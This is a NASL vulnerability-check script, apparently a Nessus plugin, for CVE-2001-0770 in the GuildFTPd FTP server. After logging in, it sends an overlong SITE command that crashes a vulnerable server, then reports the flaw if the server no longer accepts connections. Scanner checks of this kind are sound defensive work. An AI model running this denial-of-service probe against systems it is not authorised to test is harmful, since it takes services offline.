#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
#  Ref: andreas.junestam@defcom.com
#
#  This script is released under the GNU GPL v2
#

if(description)
{
 script_id(15851);
 script_bugtraq_id(2782);
 script_cve_id("CVE-2001-0770");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"5540");

 script_version ("$Revision: 1.3 $");
 name["english"] = "GuildFTPd Long SITE Command Overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote ftp server seems to be vulnerable to denial service attack through
the SITE command when handling specially long request.

Solution : Upgrade or install another ftp server.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Sends an oversized SITE command to the remote server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
  
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# da code
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 banner = get_ftp_banner(port:port);
 if ( ! banner || "GuildFTP" >!< banner ) exit(0);
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");

 if(login)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  if(ftp_authenticate(socket:soc, user:login,pass:password))
  {
   data = string("SITE ", crap(262), "\r\n");
   send(socket:soc, data:data);
   reply = ftp_recv_line(socket:soc);
   sleep(1);
   soc2 = open_sock_tcp(port);
   if(!soc2)
   {
     security_hole(port);
   }
   close(soc2);
   data = string("QUIT\n");
   send(socket:soc, data:data);
  }
  close(soc);
 }
}
